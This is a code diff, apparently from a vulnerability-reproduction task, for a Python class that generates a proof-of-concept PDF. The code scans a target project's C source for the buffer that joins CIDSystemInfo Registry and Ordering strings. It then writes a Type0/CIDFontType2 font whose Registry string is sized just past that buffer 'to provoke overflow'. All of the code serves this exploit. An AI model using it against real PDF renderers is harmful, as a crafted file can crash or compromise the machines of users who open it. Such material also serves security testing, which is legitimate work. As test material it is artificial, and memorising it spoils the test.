@@ -1,222 +1,262 @@
 import os
 import re
 import tarfile
+import zipfile
 from typing import Dict, Iterable, List, Optional, Tuple
 
 
 class Solution:
-    def __init__(self) -> None:
-        self._max_file_bytes = 2_000_000
-
     def solve(self, src_path: str) -> bytes:
-        buf_size = self._infer_fallback_buffer_size(src_path)
-        if buf_size is None or buf_size <= 0:
-            reg_len = 80000
-        else:
-            reg_len = max(64, buf_size + 32)
+        buf_size = self._detect_fallback_buffer_size(src_path)
+        overflow = 8
+        # Build "<Registry>-<Ordering>" slightly larger than buf_size to provoke overflow
+        reg_len = max(1, buf_size + overflow - 2)  # minus "-" and 1 char ordering
+        ord_len = 1
 
         registry = b"A" * reg_len
-        ordering = b"B"
-        return self._build_pdf_poc(registry, ordering)
+        ordering = b"B" * ord_len
 
-    def _iter_source_texts(self, src_path: str) -> Iterable[Tuple[str, str]]:
+        return self._make_pdf(registry, ordering)
+
+    def _iter_source_files(self, src_path: str, keyword_filter: bool = True) -> Iterable[Tuple[str, bytes]]:
+        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".inc", ".m", ".mm")
+        keywords = ("cid", "cmap", "font", "pdf", "type0", "cjk", "cff", "truetype", "ttf")
+
+        def want_path(p: str) -> bool:
+            lp = p.lower()
+            if not lp.endswith(exts):
+                return False
+            if not keyword_filter:
+                return True
+            return any(k in lp for k in keywords)
+
+        max_file_size = 5_000_000
+
         if os.path.isdir(src_path):
             for root, _, files in os.walk(src_path):
                 for fn in files:
-                    if not fn.lower().endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")):
-                        continue
-                    p = os.path.join(root, fn)
-                    try:
-                        with open(p, "rb") as f:
-                            data = f.read(self._max_file_bytes)
-                    except OSError:
+                    fp = os.path.join(root, fn)
+                    rel = os.path.relpath(fp, src_path)
+                    if not want_path(rel):
                         continue
                     try:
-                        text = data.decode("utf-8", "ignore")
+                        st = os.stat(fp)
+                        if st.st_size <= 0 or st.st_size > max_file_size:
+                            continue
+                        with open(fp, "rb") as f:
+                            yield rel, f.read()
                     except Exception:
                         continue
-                    yield p, text
             return
 
-        try:
-            if not tarfile.is_tarfile(src_path):
-                return
-        except OSError:
-            return
-
+        # Try tar
         try:
             with tarfile.open(src_path, "r:*") as tf:
                 for m in tf.getmembers():
                     if not m.isfile():
                         continue
+                    if m.size <= 0 or m.size > max_file_size:
+                        continue
                     name = m.name
-                    if not name.lower().endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")):
+                    if not want_path(name):
                         continue
                     try:
                         f = tf.extractfile(m)
                         if f is None:
                             continue
-                        data = f.read(self._max_file_bytes)
+                        data = f.read()
+                        yield name, data
                     except Exception:
+                        continue
+            return
+        except Exception:
+            pass
+
+        # Try zip
+        try:
+            with zipfile.ZipFile(src_path, "r") as zf:
+                for zi in zf.infolist():
+                    if zi.is_dir():
+                        continue
+                    if zi.file_size <= 0 or zi.file_size > max_file_size:
+                        continue
+                    name = zi.filename
+                    if not want_path(name):
                         continue
                     try:
-                        text = data.decode("utf-8", "ignore")
+                        data = zf.read(zi)
+                        yield name, data
                     except Exception:
                         continue
-                    yield name, text
-        except Exception:
             return
+        except Exception:
+            pass
 
-    def _infer_fallback_buffer_size(self, src_path: str) -> Optional[int]:
-        define_re = re.compile(r'^[ \t]*#[ \t]*define[ \t]+([A-Za-z_]\w*)[ \t]+(\d+)\b', re.M)
-        const_re = re.compile(r'^[ \t]*(?:static[ \t]+)?(?:const[ \t]+)?(?:int|unsigned[ \t]+int|size_t)[ \t]+([A-Za-z_]\w*)[ \t]*=[ \t]*(\d+)[ \t]*;', re.M)
-
-        defines: Dict[str, int] = {}
-        relevant: List[Tuple[str, str]] = []
-
-        for name, text in self._iter_source_texts(src_path):
-            for m in define_re.finditer(text):
-                k, v = m.group(1), m.group(2)
-                try:
-                    defines[k] = int(v)
-                except Exception:
-                    pass
-            for m in const_re.finditer(text):
-                k, v = m.group(1), m.group(2)
-                try:
-                    defines[k] = int(v)
-                except Exception:
-                    pass
-
-            low = text.lower()
-            if ("cid" in low and "systeminfo" in low and "registry" in low and "ordering" in low) or (
-                "registry" in low and "ordering" in low and "%s-%s" in text
-            ):
-                relevant.append((name, text))
-
+    def _detect_fallback_buffer_size(self, src_path: str) -> int:
         candidates: List[int] = []
-        for _, text in relevant:
-            candidates.extend(self._extract_buffer_candidates(text, defines))
 
-        candidates = [c for c in candidates if 8 <= c <= 5_000_000]
-        if not candidates:
-            return None
-        candidates.sort()
-        for c in candidates:
-            if c <= 4096:
-                return c
-        return candidates[0]
+        def scan_text(text: str) -> None:
+            if "CIDSystemInfo" not in text and "cid" not in text.lower():
+                return
+            if "Registry" not in text and "Ordering" not in text:
+                # still might use lowercase vars
+                if "registry" not in text.lower() or "ordering" not in text.lower():
+                    return
 
-    def _resolve_size_token(self, tok: str, defines: Dict[str, int]) -> Optional[int]:
-        tok = tok.strip()
-        if tok.isdigit():
+            arrays: Dict[str, int] = {}
+            for m in re.finditer(r"\bchar\s+([A-Za-z_]\w*)\s*\[\s*(\d+)\s*\]", text):
+                try:
+                    arrays[m.group(1)] = int(m.group(2))
+                except Exception:
+                    pass
+
+            # sprintf(buf, "%s-%s", ...)
+            for m in re.finditer(
+                r"\b(?:sprint|vsprint)f\s*\(\s*([A-Za-z_]\w*)\s*,\s*\"[^\"\n]*%s[^\"\n]*-[^\"\n]*%s[^\"\n]*\"",
+                text,
+            ):
+                buf = m.group(1)
+                sz = arrays.get(buf)
+                if sz:
+                    candidates.append(sz)
+
+            # strcat(buf, "-") and later strcat(buf, ordering)
+            # Very heuristic: look for strcat(buf,"-") and ensure 'ordering' appears near
+            for m in re.finditer(r"\bstrcat\s*\(\s*([A-Za-z_]\w*)\s*,\s*\"-\"\s*\)", text):
+                buf = m.group(1)
+                sz = arrays.get(buf)
+                if not sz:
+                    continue
+                start = max(0, m.start() - 2000)
+                end = min(len(text), m.end() + 2000)
+                window = text[start:end].lower()
+                if "registry" in window and "ordering" in window:
+                    candidates.append(sz)
+
+            # strcpy(buf, registry) then strcat(buf, ordering)
+            for m in re.finditer(r"\bstrcpy\s*\(\s*([A-Za-z_]\w*)\s*,\s*([A-Za-z_]\w*)\s*\)", text):
+                buf = m.group(1)
+                src = m.group(2).lower()
+                if "reg" not in src:
+                    continue
+                sz = arrays.get(buf)
+                if not sz:
+                    continue
+                end = min(len(text), m.end() + 2500)
+                window = text[m.start():end].lower()
+                if ("strcat" in window or "sprintf" in window) and "ordering" in window:
+                    candidates.append(sz)
+
+        # First pass: keyword-filtered
+        for _, data in self._iter_source_files(src_path, keyword_filter=True):
             try:
-                return int(tok)
+                scan_text(data.decode("latin1", "ignore"))
             except Exception:
-                return None
-        if tok in defines:
-            return defines[tok]
-        return None
+                continue
+            if candidates:
+                # If we already found a small-ish buffer, stop early
+                mn = min(candidates)
+                if mn <= 1024:
+                    break
 
-    def _extract_buffer_candidates(self, text: str, defines: Dict[str, int]) -> List[int]:
-        decl_tmpl = r'\b(?:char|signed\s+char|unsigned\s+char|fz_char)\s+{var}\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]'
-        sprintf_re = re.compile(
-            r'\b(?:sprint[fF]|vsprintf)\s*\(\s*([A-Za-z_]\w*)\s*,\s*"[^"]*%s[^"]*-[^"]*%s[^"]*"\s*,',
-            re.S,
-        )
-        strcat_dash_re = re.compile(
-            r'\bstrcat\s*\(\s*([A-Za-z_]\w*)\s*,\s*"-"\s*\)',
-            re.S,
-        )
+        # Second pass: broader scan if nothing found
+        if not candidates:
+            for _, data in self._iter_source_files(src_path, keyword_filter=False):
+                try:
+                    scan_text(data.decode("latin1", "ignore"))
+                except Exception:
+                    continue
+                if candidates:
+                    mn = min(candidates)
+                    if mn <= 1024:
+                        break
 
-        any_decl_re = re.compile(r'\b(?:char|signed\s+char|unsigned\s+char|fz_char)\s+([A-Za-z_]\w*)\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]')
+        # Sensible default
+        if not candidates:
+            return 256
 
-        cands: List[int] = []
+        mn = min(candidates)
+        if mn < 16:
+            return 16
+        if mn > 1_000_000:
+            return 256
+        return mn
 
-        for m in sprintf_re.finditer(text):
-            var = m.group(1)
-            pos = m.start()
-            lookback = text[max(0, pos - 12000):pos]
-            dv = re.compile(decl_tmpl.format(var=re.escape(var)))
-            dm = None
-            for dm2 in dv.finditer(lookback):
-                dm = dm2
-            if dm is not None:
-                sz = self._resolve_size_token(dm.group(1), defines)
-                if sz is not None:
-                    cands.append(sz)
+    def _make_pdf(self, registry: bytes, ordering: bytes) -> bytes:
+        def lit_string(s: bytes) -> bytes:
+            # Only uses A/B in our payload; no escaping required
+            return b"(" + s + b")"
 
-        for m in strcat_dash_re.finditer(text):
-            var = m.group(1)
-            pos = m.start()
-            lookback = text[max(0, pos - 12000):pos]
-            dv = re.compile(decl_tmpl.format(var=re.escape(var)))
-            dm = None
-            for dm2 in dv.finditer(lookback):
-                dm = dm2
-            if dm is not None:
-                sz = self._resolve_size_token(dm.group(1), defines)
-                if sz is not None:
-                    cands.append(sz)
+        # Content stream uses the font to ensure font load during rendering
+        content = b"BT\n/F1 12 Tf\n72 720 Td\n(Hello) Tj\nET\n"
 
-        if cands:
-            return cands
+        objs: List[bytes] = []
 
-        low = text.lower()
-        if "registry" not in low or "ordering" not in low:
-            return []
+        # 1: Catalog
+        objs.append(b"<< /Type /Catalog /Pages 2 0 R >>")
 
-        fmt_idx = text.find('"%s-%s"')
-        if fmt_idx != -1:
-            ctx = text[max(0, fmt_idx - 8000):fmt_idx + 2000]
-            last_decl = None
-            for d in any_decl_re.finditer(ctx):
-                last_decl = d
-            if last_decl is not None:
-                sz = self._resolve_size_token(last_decl.group(2), defines)
-                if sz is not None:
-                    cands.append(sz)
+        # 2: Pages
+        objs.append(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
 
-        return cands
-
-    def _build_pdf_poc(self, registry: bytes, ordering: bytes) -> bytes:
-        header = b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n"
-
-        contents = b"BT /F1 1 Tf 0 0 Td (A) Tj ET"
-        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
-        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
-        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /MediaBox [0 0 1 1] /Contents 5 0 R >>\nendobj\n"
-        obj4 = b"4 0 obj\n<< /Type /Font /Subtype /Type0 /BaseFont /F1Base /Encoding /Identity-H /DescendantFonts [6 0 R] >>\nendobj\n"
-        obj5 = (
-            b"5 0 obj\n<< /Length " + str(len(contents)).encode("ascii") + b" >>\nstream\n" + contents + b"\nendstream\nendobj\n"
+        # 3: Page
+        objs.append(
+            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
+            b"/Resources << /Font << /F1 4 0 R >> >> "
+            b"/Contents 5 0 R >>"
         )
 
-        cid_sysinfo = b"<< /Registry (" + registry + b") /Ordering (" + ordering + b") /Supplement 0 >>"
-        obj6 = (
-            b"6 0 obj\n<< /Type /Font /Subtype /CIDFontType2 /BaseFont /F1Base /CIDSystemInfo "
-            + cid_sysinfo
-            + b" /FontDescriptor 7 0 R /DW 1000 /W [0 [1000]] /CIDToGIDMap /Identity >>\nendobj\n"
-        )
-        obj7 = b"7 0 obj\n<< /Type /FontDescriptor /FontName /F1Base /Flags 4 /FontBBox [0 0 1 1] /ItalicAngle 0 /Ascent 1 /Descent 0 /CapHeight 1 /StemV 1 >>\nendobj\n"
-
-        objs = [obj1, obj2, obj3, obj4, obj5, obj6, obj7]
-
-        offsets = [0]
-        cur = len(header)
-        for o in objs:
-            offsets.append(cur)
-            cur += len(o)
-
-        xref_off = cur
-        xref_entries = [b"0000000000 65535 f \n"]
-        for i in range(1, 8):
-            xref_entries.append(f"{offsets[i]:010d} 00000 n \n".encode("ascii"))
-
-        xref = b"xref\n0 8\n" + b"".join(xref_entries)
-        trailer = (
-            b"trailer\n<< /Size 8 /Root 1 0 R >>\nstartxref\n"
-            + str(xref_off).encode("ascii")
-            + b"\n%%EOF\n"
+        # 4: Type0 font (keep /Encoding valid; omit keys that might reject parsing)
+        objs.append(
+            b"<< /Type /Font /Subtype /Type0 /BaseFont /F1 /Encoding /Identity-H "
+            b"/DescendantFonts [6 0 R] >>"
         )
 
-        return header + b"".join(objs) + xref + trailer
+        # 5: Contents stream
+        stream_dict = b"<< /Length " + str(len(content)).encode("ascii") + b" >>"
+        objs.append(stream_dict + b"\nstream\n" + content + b"endstream")
+
+        # 6: CIDFontType2; omit /BaseFont to encourage fallback usage
+        cid_system_info = (
+            b"<< /Registry " + lit_string(registry) +
+            b" /Ordering " + lit_string(ordering) +
+            b" /Supplement 0 >>"
+        )
+        objs.append(
+            b"<< /Type /Font /Subtype /CIDFontType2 "
+            b"/CIDSystemInfo " + cid_system_info +
+            b" /FontDescriptor 7 0 R "
+            b"/W [0 [500]] "
+            b"/CIDToGIDMap /Identity >>"
+        )
+
+        # 7: FontDescriptor
+        objs.append(
+            b"<< /Type /FontDescriptor /FontName /F1 "
+            b"/Flags 32 "
+            b"/FontBBox [0 0 1000 1000] "
+            b"/ItalicAngle 0 "
+            b"/Ascent 800 "
+            b"/Descent -200 "
+            b"/CapHeight 700 "
+            b"/StemV 80 >>"
+        )
+
+        out = bytearray()
+        out += b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n"
+
+        offsets: List[int] = [0]
+        for i, body in enumerate(objs, start=1):
+            offsets.append(len(out))
+            out += str(i).encode("ascii") + b" 0 obj\n"
+            out += body + b"\nendobj\n"
+
+        xref_off = len(out)
+        n = len(objs) + 1
+        out += b"xref\n0 " + str(n).encode("ascii") + b"\n"
+        out += b"0000000000 65535 f \n"
+        for i in range(1, n):
+            out += f"{offsets[i]:010d} 00000 n \n".encode("ascii")
+
+        out += b"trailer\n<< /Size " + str(n).encode("ascii") + b" /Root 1 0 R >>\n"
+        out += b"startxref\n" + str(xref_off).encode("ascii") + b"\n%%EOF\n"
+        return bytes(out)
